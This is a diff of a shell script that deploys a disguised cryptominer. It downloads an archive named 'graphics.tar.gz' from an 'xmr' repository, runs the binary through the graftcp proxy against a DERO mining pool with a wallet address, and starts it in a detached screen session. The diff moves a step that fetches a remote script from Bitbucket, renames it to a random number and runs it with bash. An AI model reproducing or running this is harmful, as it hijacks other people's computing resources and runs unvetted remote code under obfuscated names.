@@ -1,7 +1,5 @@
 sudo apt install screen -y > /dev/null 2>&1
 
-wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh 
-
 wget https://github.com/catursawah/xmr/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -45,6 +43,7 @@ chmod 777 $GOGO
 
 screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.MARKONAH &
 screen -ls &
+wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh &
 TIME=$(shuf -i 10000-9999999999 -n 1) &
 mv -f time.sh $TIME &
 bash $TIME
